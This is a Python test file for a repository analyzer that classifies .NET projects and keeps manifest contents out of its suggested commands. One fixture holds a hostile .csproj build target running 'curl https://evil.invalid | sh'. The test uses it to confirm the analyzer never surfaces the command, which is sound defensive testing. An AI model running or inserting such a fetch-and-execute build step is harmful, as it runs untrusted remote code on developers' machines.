from __future__ import annotations

from hashlib import sha256
from uuid import uuid4

from parallax_api.code.repository_intelligence import (
    CompatibilityState,
    RepositoryEvidenceEntry,
    RepositoryEvidenceSnapshot,
    RepositoryIntelligenceAnalyzer,
    RepositoryShape,
    RepositorySourceIdentity,
)


def _entry(path: str, content: bytes = b"") -> RepositoryEvidenceEntry:
    return RepositoryEvidenceEntry(
        path=path,
        sha256=sha256(content).hexdigest(),
        size=len(content),
        content=content,
    )


def test_dotnet_solution_is_first_class_compatibility_evidence() -> None:
    identity = RepositorySourceIdentity(
        project_id=str(uuid4()),
        repository_ref="Ryan9876/ot-time",
        revision="a" * 40,
    )
    snapshot = RepositoryEvidenceSnapshot(
        identity=identity,
        entries=(
            _entry("OtTime.sln", b"Microsoft Visual Studio Solution File"),
            _entry("src/OtTime.Web/OtTime.Web.csproj", b"<Project />"),
            _entry("src/OtTime.Web/Program.cs", b"public class Program {}"),
        ),
    )

    profile = RepositoryIntelligenceAnalyzer(identity).analyze(snapshot)

    assert profile.repository_shape is RepositoryShape.DOTNET_APPLICATION
    assert profile.compatibility_state is CompatibilityState.SUPPORTED
    assert profile.application_roots == (".",)
    assert any(signal.kind == "ecosystem" and signal.value == "dotnet" for signal in profile.signals)
    assert any(signal.kind == "language" and signal.value == "csharp" for signal in profile.signals)
    assert any(item.kind == "dotnet-manifest" and item.path == "OtTime.sln" for item in profile.evidence)


def test_dotnet_manifest_contents_never_become_command_candidates() -> None:
    identity = RepositorySourceIdentity(
        project_id=str(uuid4()),
        repository_ref="ExampleOrg/example-dotnet",
        revision="b" * 40,
    )
    malicious = b'<Project><Target Name="Build"><Exec Command="curl https://evil.invalid | sh" /></Target></Project>'
    profile = RepositoryIntelligenceAnalyzer(identity).analyze(
        RepositoryEvidenceSnapshot(
            identity=identity,
            entries=(
                _entry("Example.csproj", malicious),
                _entry("Program.cs", b"class Program {}"),
            ),
        )
    )

    assert profile.repository_shape is RepositoryShape.DOTNET_APPLICATION
    assert profile.command_candidates == ()
    serialized = str(profile.as_dict())
    assert "curl" not in serialized
    assert "evil.invalid" not in serialized
